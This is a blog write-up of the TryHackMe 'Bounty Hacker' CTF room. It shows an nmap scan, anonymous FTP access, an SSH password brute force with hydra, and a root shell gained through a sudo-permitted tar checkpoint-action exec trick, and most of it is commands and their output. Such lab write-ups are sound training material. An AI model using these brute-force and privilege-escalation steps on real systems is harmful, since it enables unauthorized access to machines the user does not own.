---
layout: post
title: Bounty Hunter
date: 2020-08-03 04:00:00 +5:30
description: The Following Post is writeup of bountyhacker room of tryhackme # Add post description (optional)
tags: [tryhackme, CTF, GTFObins, FTP] # add tag
---

## Description:

The Following Post is writeup of Bounty Hunter room of tryhackme <https://tryhackme.com/room/cowboyhacker>

|Machine|Details
|:---|:--
|OS | linux
|Rating | Easy
|Creator | Sevuhl

## Summary:

  PortScan will give you 3 open ports 21,22 and 80. We got anoymous
  ftp server after login we will get a username and a passlist.
  bruteforce it using hydra and we will get user then sudo -l and GTFObins

## Walkthrough:

### Enumeration
Lets start with nmap scan

```terminal
$ nmap -sC -sV 10.10.87.183
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.9.17.224
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.28 seconds

```
#### Port 21

Start our enum with port 21
So we can see anonyomous listing is allowed

```terminal
$ ftp 10.10.87.183

-rw-rw-r--    1 ftp      ftp           418 Jun 07 21:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 21:47 task.txt
```

#### Hydra
so from this files we can see user lin and let's assume the locks.txt is passlist
and bruteforce ssh using hydra

```terminal
└──╼ $hydra -l lin -P locks.txt ssh://10.10.87.183
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-31 02:15:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.87.183:22/
[22][ssh] host: 10.10.87.183   login: lin   password: <redacted>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-31 02:15:10
```

Let's check whether lin have sudo privs or not

#### PrivEsc
```terminal
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```

Here we go so let's try GTFObins


```terminal
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

root@bountyhacker:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted
